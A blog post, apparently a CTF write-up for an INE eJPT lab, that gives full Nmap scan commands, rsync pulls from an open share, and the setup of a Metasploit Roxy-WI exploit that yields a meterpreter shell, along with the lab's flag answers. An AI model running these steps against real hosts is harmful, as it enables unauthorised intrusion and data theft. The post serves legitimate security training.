---
layout: post
title: "The Metasploit Framework CTF 2 Write-up"
date: 2026-08-19
link: https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student
link_text: "INE eJPT Course"
categories: ctf-writeups
---
# Lab Environment

In this lab environment, you will have GUI access to a Kali Linux machine. Two machines are accessible at **target1.ine.local** and **target2.ine.local**.

**Objective:** Using various exploration techniques, complete the following tasks to capture the associated flags:

- **Flag 1:** Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.
- **Flag 2:** The files on the RSYNC server hold valuable information. Explore the contents to find the flag.
- **Flag 3:** Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.
- **Flag 4:** Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.

# Tools

The best tools for this lab are:

- Nmap
- Metasploit Framework
- rsync

---

### Note

In this lab, the flag will follow the format: FLAG1_MD5Hash. For example, FLAG1_0f4d0db3668dd58cabb9eb409657eaa8. You need to submit only the MD5 hash string, excluding the underscore (_). For instance: 0f4d0db3668dd58cabb9eb409657eaa8.

---
# Task 1

**Clue:** Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.

The first step is to run an Nmap scan on target 1.

`nmap -sS -A -p- -T4 target1.ine.local`

- `-sS`: runs a TCP SYN scan
- `-A`: enables OS detection, version detection, script scanning, and traceroute
- `-p-`: sets the port range from 1-65535
- `-T4`: sets the aggressiveness of the scan to a 4 out of 5

![](/assets/writeup_assets/the_metasploit_framework_ctf_2_writeup/target1_nmap.png)
*Figure 1: Target 1 Nmap scan*

Use **rsync** to get the first flag: `rsync rsync://target1.ine.local/`.

![](/assets/writeup_assets/the_metasploit_framework_ctf_2_writeup/flag1.png)
*Figure 2: Flag 1*

The first flag is `30f2735696e2433d9ef1dc53600261ac`.

---
# Task 2

**Clue:** The files on the RSYNC server hold valuable information. Explore the contents to find the flag.

Navigate to the `backupwscohen` directory and list the files with `rsync rsync://target1.ine.local/backupwscohen/`.

![](/assets/writeup_assets/the_metasploit_framework_ctf_2_writeup/dir_listing.png)
*Figure 3: backupwscohen dir listing*

Download each of the three files with `rsync rsync://target1.ine.local/backupwscohen/[file name] [file name]`. Then, `cat` out each file to check its contents.

![](/assets/writeup_assets/the_metasploit_framework_ctf_2_writeup/flag2.png)
*Figure 4: Flag 2*

Flag 2 is in `pii_data.xlsx`: `FLAG2_2c241f8b21f649c49fef3609b63380af`.

---
# Task 3

**Clue:** Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.

The Nmap scan for `target2.ine.local` is below.

![](/assets/writeup_assets/the_metasploit_framework_ctf_2_writeup/target2_nmap.png)
*Figure 5: Target 2 Nmap scan*

Check the website's homepage for clues.

![](/assets/writeup_assets/the_metasploit_framework_ctf_2_writeup/homepage.png)
*Figure 6: Target 2's HTTP homepage auto-downloads a Python file*

A file, `overview.py`, is automatically downloaded. **Port 443** is also open. Check the **HTTPS** page.

![](/assets/writeup_assets/the_metasploit_framework_ctf_2_writeup/homepage_2.png)
*Figure 7: Target 2's HTTPS homepage shows a login screen*

The website is built on **Roxy-WI**. Search **msfconsole** for it to see if there are any exploits.

![](/assets/writeup_assets/the_metasploit_framework_ctf_2_writeup/exploit_search.png)*Figure 8: Exploit search*

There is one. Activate it and configure it:

```
set RHOSTS target2.ine.local
set LHOST [local IP]
run
```

A **meterpreter** session will open. Navigate to the root directory to find the third flag.

![](/assets/writeup_assets/the_metasploit_framework_ctf_2_writeup/flag3.png)
*Figure 9: Flag 3*

---
# Task 4

**Clue:** Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.

First, check the running processes with `ps`.

![](/assets/writeup_assets/the_metasploit_framework_ctf_2_writeup/ps.png)
*Figure 10: Viewing running processes*

Nothing sticks out as a clue. Next, check the cron jobs in `/etc/cron.d`. 

![](/assets/writeup_assets/the_metasploit_framework_ctf_2_writeup/cron_jobs.png)
*Figure 11: Viewing cron jobs*

The final flag is located in `www-data-cron`.

![](/assets/writeup_assets/the_metasploit_framework_ctf_2_writeup/flag4.png)
*Figure 12: Flag 4*

Flag 4 is `FLAG4_e607389fc1bf44e09aae516bf3416a60`.
